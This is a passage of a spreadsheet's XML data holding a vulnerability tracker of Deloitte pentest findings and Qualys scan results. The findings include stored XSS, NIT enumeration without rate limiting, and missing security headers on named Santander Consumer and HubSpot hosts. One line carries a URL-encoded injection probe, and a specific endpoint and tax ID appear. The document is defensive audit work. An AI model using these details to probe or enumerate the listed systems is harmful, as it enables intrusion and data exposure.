quedarán almacena_x0002_das en el navegador durante un tiempo determinado que se establece en la propia cabecera de respuesta."/>
    <s v="En caso de no configurar la cabecera HTTP Strict Transport Security correctamente en el servidor _x000a_web, un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web _x000a_y forzarle a utilizar el protocolo HTTP sin cifrar, de manera que las comunicaciones entre cliente y _x000a_servidor se harían en texto claro y quedarían expuestos datos sensibles o contraseñas."/>
    <s v="Se recomienda configurar el servidor remoto para que se incluya la cabecera de respuesta &quot;HSTS&quot; _x000a_en todas las respuestas del servidor. La sintaxis para ello es:_x000a_ Strict-Transport-Security: max-age=&lt;seconds&gt;[; includeSubDomains] _x000a_El parámetro &quot;max-age&quot; especifica el tiempo requerido para usar HTTPS y debería ser un número _x000a_alto, del orden de varios meses. La flag &quot;includeSubDomains&quot; define que la política aplica también a _x000a_los subdominios"/>
    <s v="sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="563"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="PRYECTO"/>
    <s v="MAN-69b3121976713a70a19f6208"/>
    <m/>
    <x v="221"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="http://186.190.254.106:443/api/ConsultarDetalleCliente"/>
    <m/>
    <m/>
    <d v="2026-03-14T00:00:00"/>
    <n v="101"/>
    <d v="2026-06-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  DESCRIPCIÓN   Se ha detectado una falta de medidas o controles para detectar y mitigar los intentos de automatización maliciosa en el activo. La automatización maliciosa se refiere al uso de herramientas automatizadas o scripts para llevar a cabo actividades fraudulentas, como el envío masivo de solicitudes o ataques de fuerza bruta.   La ausencia de dichos mecanismos ha permitido realizar una enumeración proporcionando distintos identificadores.   DETALLE   SCBD-2025-CNMPO-013-AP-001:   Durante la realización de las pruebas, se ha detectado que es posible obtener la información asociada a diferentes NIT (Número de Identificación Tributaria). La ausencia de mecanismos que limiten el envío de múltiples peticiones ha permitido realizar una enumeración dentro del sistema, proporcionando diferentes NIT.   El envío de la siguiente petición hacía la aplicación permite obtener los datos asociados al NIT “8917000379”, tal y como se muestra en la siguiente evidencia.      Ilustración 2 Petición para obtener el registro asociado al NIT 8917000379   El servidor responde a la petición enviada proporcionando el valor asociado a dicho NIT, tal y como se puede observar en la siguiente evidencia.      Ilustración 3 Información asociada al registro NIT 8917000379   Posteriormente, se ha realizado el envío de múltiples peticiones en un corto intervalo de tiempo, con el fin de poder encontrar datos asociados a diferentes NIT, tal y como se puede observar en la siguiente captura, se ha realizado el envío de 592 peticiones y se ha obtenido 3 registros asociados.      Ilustración 4 Envío de múltiples peticiones.       RIESGO   La ausencia de un mecanismo anti-automatización puede tener los siguientes impactos negativos en la seguridad:   Sin un mecanismo para detectar y bloquear los intentos de fuerza bruta, un atacante puede realizar una gran cantidad de intentos de inicio de sesión o de adivinación de contraseñas sin restricciones. Esto aumenta las posibilidades de que un atacante pueda acceder ilegalmente a cuentas de usuario o a recursos protegidos.   Los ataques automatizados pueden generar una alta carga en el sistema, consumiendo recursos como ancho de banda, capacidad de procesamiento y memoria. Esto puede llevar a una degradación del rendimiento y, en casos extremos, a la indisponibilidad del sistema para los usuarios legítimos."/>
    <m/>
    <s v="  RECOMENDACIÓN   Se recomienda implementar medidas para evitar que ningún mecanismo automático pueda realizar el proceso de autenticación en la aplicación, como por ejemplo un sistema reCAPTCHA, que consiste en una prueba de desafío-respuesta utilizada en computación para determinar cuándo un usuario es o no humano."/>
    <s v="sin definir"/>
    <m/>
    <s v="Alejandra Rodrigez"/>
  </r>
  <r>
    <n v="564"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="MAN-69c1773c2813d3056436488a"/>
    <s v="SC-26-CNMP0-001-AP-001 "/>
    <x v="222"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5.4"/>
    <m/>
    <m/>
    <s v="api.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-24T00:00:00"/>
    <n v="91"/>
    <d v="2026-06-22T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  DESCRIPCIÓN   La vulnerabilidad de Cross Site Scripting (XSS) almacenado o persistente hace referencia a la posibilidad de inyectar código JavaScript en datos controlados por el usuario, normalmente en el valor de los parámetros URL o de los formularios HTML. Estos datos son utilizados por la aplicación para generar contenido dinámicamente, que será presentado al navegador del usuario el cual interpretará el código inyectado.   DETALLE   Se ha identificado que no se codifican ciertos valores al ser almacenados, por lo que sería posible inyectar código HTML y/o JavaScript. Al no codificar los valores, una vez dichos valores sean recuperados de la base de datos y renderizados por el usuario, el código no codificado puede ser ejecutado en el navegador permitiendo la toma de control del navegador del usuario, desde la propia sesión del usuario, en la que se pueden llevar a cabo acciones como el robo de identificadores de sesión pudiendo dar lugar a la suplantación de la identidad del usuario.   A modo de evidencia se muestra como se introduce código JavaScript:      Dicho endpoint devuelve un código de creación, indicando los valores almacenados, donde se ve que no se ha codificado y un identificador:          Tras ser almacenado, si se solicita el elemento creado por su identificador, se observa como el contenido contiene el valor no codificado:          Si la aplicación que solicita el valor al endpoint, no codifica adecuadamente el valor devuelto, este será interpretado por el navegador ejecutándose código JavaScript en el navegador del usuario.       NOTA: Como no se conoce la aplicación que va a utilizar la API, no se puede determinar el riesgo final de la vulnerabilidad. Sin embargo, se recomienda que estos valores sean almacenados codificados para evitar el riesgo.       SC-26-CNMP0-001-AP-001-001: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   Parámetro:   - content         SC-26-CNMP0-001-AP-001-002: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   Parametro:   - hs_pipeline_stage             SC-26-CNMP0-001-AP-001-003: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   Parámetro:   - subject             SC-26-CNMP0-001-AP-001-004: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crm/v3/objects/tickets/20085607730ojvio%3ca%20b%3dc%3ez0upo?archived=false            SC-26-CNMP0-001-AP-001-005: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files/v3/folders       Parámetro:   - name             SC-26-CNMP0-001-AP-001-006:   A modo de evidencia se muestra un ejemplo de inyección, mediante código JavaScript, el cual será almacenado y posteriormente recuperado por la funcionalidad que lo requiera, pudiendo ser ejecutado en el navegador del usuario al ser renderizado ya que no ha sido codificado.      URL:   - https://api.hubapi.com/files/v3/folders   Parámetro:   - parentPath              RIESGO   Mediante la inyección de código que permite la presente vulnerabilidad un atacante podría almacenar código JavaScript en la aplicación con la finalidad de realizar alguna de las siguientes acciones:      - Robo y suplantación de la sesión del usuario: Acceder al identificador de sesión del usuario que, normalmente, se encuentra almacenado a través de una cookie.   - Phishing: Modificar el aspecto de la aplicación Web y pedir a los usuarios información sensible.   - Explotación de vulnerabilidades: Incluir código especialmente diseñado para explotar vulnerabilidades del navegador, de los conectores del mismo o del Sistema Operativo de la víctima. Esto puede tener consecuencias muy diversas, que pueden llevar a comprometer totalmente el sistema de la víctima.   - Ejecución de acciones de forma &quot;transparente&quot; para el usuario: Interactuar con la aplicación y realizar acciones sin el conocimiento del usuario."/>
    <s v="Mediante la inyección de código que permite la presente vulnerabilidad un atacante podría _x000a_almacenar código JavaScript en la aplicación con la finalidad de realizar alguna de las siguientes _x000a_acciones:  _x000a_  - Robo y suplantación de la sesión del usuario: Acceder al identificador de sesión del usuario _x000a_que, normalmente, se encuentra almacenado a través de una cookie.   - Phishing: Modificar el aspecto de la aplicación Web y pedir a los usuarios información _x000a_sensible.  - Explotación de vulnerabilidades: Incluir código especialmente diseñado para explotar _x000a_vulnerabilidades del navegador, de los conectores del mismo o del Sistema Operativo de la _x000a_víctima. Esto puede tener consecuencias muy diversas, que pueden llevar a comprometer _x000a_totalmente el sistema de la víctima. "/>
    <s v="  Se recomienda establecer un filtro adecuado sobre los valores de los parámetros controlables por los usuarios, de forma que se valide adecuadamente la información transmitida a través de los mismos.   Existen dos estrategias generales para implantar este filtro:      - Filtrado de lista blanca: Se valida la información recibida en función de la información esperada.   - Filtrado de lista negra: Se valida la información recibida eliminando o codificando en entidades HTML caracteres considerados como peligrosos, pues podrían servir para la construcción de código JavaScript. Esta lista de caracteres podría ser “’”, “&lt;”, “&gt;”, “)”, “(“, “”” y la cadena “script”.      De forma general, se recomienda seguir siempre una estrategia de filtrado basada en listas blancas ya que son más seguras, y únicamente en el caso de que la validación de los datos de entrada tenga una complejidad alta, se recomienda utilizar una estrategia basada en listas negras.   Por último, también se recomienda escapar el contenido de salida de la aplicación, para evitar que el navegador del usuario interprete código JavaScript debido a una inyección de código, una posibilidad sería renderizar caracteres especiales como HTML Entities."/>
    <s v="sin definir"/>
    <m/>
    <m/>
  </r>
  <r>
    <n v="565"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="MAN-69c280862813d3056436575e"/>
    <s v="SC-26-CNMPA-004-AP-001 "/>
    <x v="223"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.3"/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2026-03-24T00:00:00"/>
    <n v="91"/>
    <d v="2026-06-22T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  DESCRIPCIÓN   Muchas de las acciones o funcionalidades que presentan las aplicaciones requieren establecer límites en el número de veces que se puede realizar una determinada funcionalidad o acción. Las aplicaciones deben controlar que un usuario no pueda exceder un límite en el uso de estas funcionalidades ya que, en determinados casos, cada vez que se utiliza la funcionalidad afectada en el aplicativo, el usuario puede obtener algún tipo de beneficio o causar algún tipo de acción no deseada sobre la aplicación. Por ejemplo: un sitio de comercio electrónico solo puede permitir que los usuarios apliquen un descuento una vez por transacción o se pueda valorar y/o comentar una única vez cada producto obtenido.   Las vulnerabilidades relacionadas con las pruebas de los límites de función son específicas de cada aplicación en concreto y diseñar pruebas acorde a la funcionalidad y acciones de la propia aplicación.   Un atacante podría eludir la lógica de negocio y ejecutar una funcionalidad más veces de las permitidas obteniendo algún tipo de beneficio o acción malintencionada en la aplicación.   DETALLE   La ausencia de controles para prevenir que una determinada acción pueda ser utilizada un número determinado de veces puede ser aprovechada por un atacante para realizar acciones no deseadas en la aplicación.   En este caso particular, la aplicación no controla el número de veces que un usuario puede realizar la acción de inicio de sesión obteniendo un comportamiento no deseado en la aplicación.   A continuación, se muestra evidencia del resultado de realizar la acción afectada un gran número de veces en un corto espacio de tiempo.         Ilustración 4 - Request      Ilustración 5 - Response      Ilustración 6 - Ausencia de controles de automatización       RIESGO   La ausencia de controles para evitar automatizaciones puede dar lugar a diferentes tipos de ataque como, por ejemplo, ataques de fuerza bruta para tratar de averiguar las credenciales de un usuario, ataques de denegación de servicio al abusar de un formulario para obtener algún tipo de descuento y otro tipo de ataques que resultan en la evasión de la lógica de negocio de la aplicación."/>
    <m/>
    <s v="  La aplicación debe controlar la lógica de negocio para garantizar que una determinada funcionalidad o acción solo puede ejecutarse un cierto número de veces limitado, cuando se alcance el límite establecido, el usuario ya no puede ejecutar la funcionalidad.   Dependiendo de la acción afectada se controlará el número de veces que una acción se puede utilizar, o las veces que se puede utilizar en un determinado intervalo de tiempo."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="566"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <s v="MAN-69c280f62813d3056436575f"/>
    <s v="SC-26-CNMPA-004-AP-002"/>
    <x v="5"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.3"/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2026-03-24T00:00:00"/>
    <n v="91"/>
    <d v="2026-06-22T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="  DESCRIPCIÓN   Se ha detectado que la aplicación devuelve información acerca de la infraestructura utilizada para sustentar a la propia aplicación, más concretamente de nginx,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ETALLE   Durante las pruebas realizadas se ha comprobado que las cabeceras de la respuesta a la petición revelan información interna acerca del tipo de servidor y versión del mismo.       A continuación, se incluye una evidencia de ejemplo que muestra la información del servidor expuesta.                                          Ilustración 2 - Revelación de información de servidor       RIESGO   Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma."/>
    <s v="La ausencia de controles para evitar automatizaciones puede dar lugar a diferentes tipos de ataque _x000a_como, por ejemplo, ataques de fuerza bruta para tratar de averiguar las credenciales de un usuario, _x000a_ataques de denegación de servicio al abusar de un formulario para obtener algún tipo de descuento y _x000a_otro tipo de ataques que resultan en la evasión de la lógica de negocio de la aplicación. "/>
    <s v="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
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="568"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <m/>
    <s v="SC-26-CNMPA-004-AP-003"/>
    <x v="224"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.4"/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2026-03-24T00:00:00"/>
    <n v="91"/>
    <d v="2026-07-22T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de la infraestructura utilizada para  sustentar a la propia aplicación. _x000a_Esta información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros.  _x000a_Normalmente este tipo de información se puede encontrar en las cabeceras HTTP de respuesta del servidor o en alguna página de error o por defecto del aplicativo. "/>
    <s v="Conocer tipo concreto del la tecnología interna utilizada para sustentar el aplicativo, y su versión, _x000a_permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas _x000a_así como generar ataques más elaborados contra la plataforma. "/>
    <s v="Se recomienda evitar que la aplicación no devuelva al usuario información relativa a las tecnologías _x000a_que usa. Para ello es necesario eliminar las cabeceras de respuesta HTTP, páginas por defecto y _x000a_mensajes de error que divulguen este tipo de información. "/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="569"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <m/>
    <s v="SC-26-CNMPA-004-AP-004"/>
    <x v="158"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.4"/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2026-03-24T00:00:00"/>
    <n v="91"/>
    <d v="2026-07-22T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La cabecera &quot;CSP&quot; (Content Security Policy) permite al navegador del usuario controlar los recursos JavaScript cargados en el aplicativo web, pudiendo controlar los dominios que tienen permitido la carga de scripts en la página. "/>
    <s v="La ausencia de la cabecera &quot;Content Security Policy&quot; puede permitir a un atacante que localice una _x000a_vulnerabilidad de tipo &quot;Cross Site Scripting&quot; explotar la vulnerabilidad sin encontrarse ningún _x000a_sistema de protección que mitigue su impacto.  _x000a_El resultado de este ataque podría ser, la obtención información acerca de tokens de sesión, cookies _x000a_y demás información sensible que un cliente pueda estar transmitiendo al sitio web. "/>
    <s v="Para implementar esta cabecera es necesario realizar un análisis completo de la aplicación web y _x000a_observar los recursos que utiliza la misma, si son locales o provienen de algún dominio externo, e _x000a_incluirlos en la cabecera, ya que la propia cabecera &quot;Content Security Policy&quot; va a actuar como una _x000a_lista blanca para los recursos JavaScript que pueden ser cargados en la aplicación web.   _x000a_Es necesario configurar el servidor web para que devuelva la cabecera HTTP &quot;Content-Security_x000a_Policy&quot; (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se _x000a_trata de una versión antigua y no es necesario configurarla).   "/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <m/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Garantia"/>
    <m/>
    <s v="SC-26-CNMPA-004-AP-005"/>
    <x v="225"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.3"/>
    <m/>
    <m/>
    <s v="garantia.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2026-03-24T00:00:00"/>
    <n v="91"/>
    <d v="2026-07-22T00:00:00"/>
    <x v="2"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que la función &quot;autocompletar&quot; se encuentra habilitada en el formulario de autenticación del usuario.  _x000a_Un usuario que haga uso de esta funcionalidad en un ordenador público, o que sea utilizado por terceros, permitiría al siguiente usuario del puesto ver los datos introducidos para acceder a la _x000a_aplicación. Así mismo, un atacante que dispusiera de acceso remoto al equipo también podría acceder a estos datos de inicio de sesión."/>
    <s v="Un usuario que acceda al aplicativo desde un ordenador público, o que sea utilizado por terceros, _x000a_permitiría al siguiente usuario del puesto ver los datos introducidos para acceder a la aplicación.  "/>
    <s v="Se recomienda añadir la directiva &quot;autocomplete=off&quot; en todos los campos que contengan _x000a_información sensible que vaya a ser enviada a la aplicación. De esta manera se evita que esta _x000a_información sea almacenada por el navegador y posteriormente recuperada por un tercero con _x000a_acceso al navegador del usuario."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="567"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM--1251281810878723290"/>
    <m/>
    <x v="226"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="api-auto.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-18T00:00:00"/>
    <n v="97"/>
    <d v="2026-06-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Your firewall policy seems to let TCP packets with a specific source port pass through."/>
    <m/>
    <s v="Make sure that all your filtering rules are correct and strict enough. If the firewall intends to deny TCP connections to a specific port, it should be configured to block all TCP SYN packets going to this port, regardless of the source port."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="571"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM-2455376390591551191"/>
    <m/>
    <x v="227"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="eu1.mx.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17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m/>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aime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="572"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM-2608568286331767773"/>
    <m/>
    <x v="227"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="smtp.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17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m/>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aime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="573"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM--3134702355103034807"/>
    <m/>
    <x v="227"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="smtp.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17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m/>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aime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="574"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM--4960984737177022586"/>
    <m/>
    <x v="226"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="zorse-na1.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Your firewall policy seems to let TCP packets with a specific source port pass through."/>
    <m/>
    <s v="Make sure that all your filtering rules are correct and strict enough. If the firewall intends to deny TCP connections to a specific port, it should be configured to block all TCP SYN packets going to this port, regardless of the source port."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="575"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM--5118819666516968506"/>
    <m/>
    <x v="226"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="candidate.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Your firewall policy seems to let TCP packets with a specific source port pass through."/>
    <m/>
    <s v="Make sure that all your filtering rules are correct and strict enough. If the firewall intends to deny TCP connections to a specific port, it should be configured to block all TCP SYN packets going to this port, regardless of the source port."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="576"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM--5255039487965443251"/>
    <m/>
    <x v="227"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="mx.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17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m/>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aime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="577"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM-5838260970963253057"/>
    <m/>
    <x v="227"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="smtp.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17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s v=" "/>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aime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="578"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM--593303555179963897"/>
    <m/>
    <x v="226"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="zorse.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Your firewall policy seems to let TCP packets with a specific source port pass through."/>
    <m/>
    <s v="Make sure that all your filtering rules are correct and strict enough. If the firewall intends to deny TCP connections to a specific port, it should be configured to block all TCP SYN packets going to this port, regardless of the source port."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="579"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM-6614836549189013734"/>
    <m/>
    <x v="226"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="users.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Your firewall policy seems to let TCP packets with a specific source port pass through."/>
    <m/>
    <s v="Make sure that all your filtering rules are correct and strict enough. If the firewall intends to deny TCP connections to a specific port, it should be configured to block all TCP SYN packets going to this port, regardless of the source port."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="580"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM--7025472626260108482"/>
    <m/>
    <x v="226"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="users-na1.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Your firewall policy seems to let TCP packets with a specific source port pass through."/>
    <m/>
    <s v="Make sure that all your filtering rules are correct and strict enough. If the firewall intends to deny TCP connections to a specific port, it should be configured to block all TCP SYN packets going to this port, regardless of the source port."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="581"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM--720111118526219180"/>
    <m/>
    <x v="226"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="public.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Your firewall policy seems to let TCP packets with a specific source port pass through."/>
    <m/>
    <s v="Make sure that all your filtering rules are correct and strict enough. If the firewall intends to deny TCP connections to a specific port, it should be configured to block all TCP SYN packets going to this port, regardless of the source port."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="582"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM-7685521894562521108"/>
    <m/>
    <x v="226"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="public-na1.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Your firewall policy seems to let TCP packets with a specific source port pass through."/>
    <m/>
    <s v="Make sure that all your filtering rules are correct and strict enough. If the firewall intends to deny TCP connections to a specific port, it should be configured to block all TCP SYN packets going to this port, regardless of the source port."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="583"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM-8586184057398410764"/>
    <m/>
    <x v="226"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="feedback.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Your firewall policy seems to let TCP packets with a specific source port pass through."/>
    <m/>
    <s v="Make sure that all your filtering rules are correct and strict enough. If the firewall intends to deny TCP connections to a specific port, it should be configured to block all TCP SYN packets going to this port, regardless of the source port."/>
    <s v="sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="584"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM--9049177468578007296"/>
    <m/>
    <x v="227"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="smtp.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17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m/>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aime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="585"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Hubspot"/>
    <s v="QA-VM--999889811601462579"/>
    <m/>
    <x v="226"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <s v="nav.hubapi.com"/>
    <m/>
    <m/>
    <d v="2026-03-19T00:00:00"/>
    <n v="96"/>
    <d v="2026-06-17T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Your firewall policy seems to let TCP packets with a specific source port pass through."/>
    <m/>
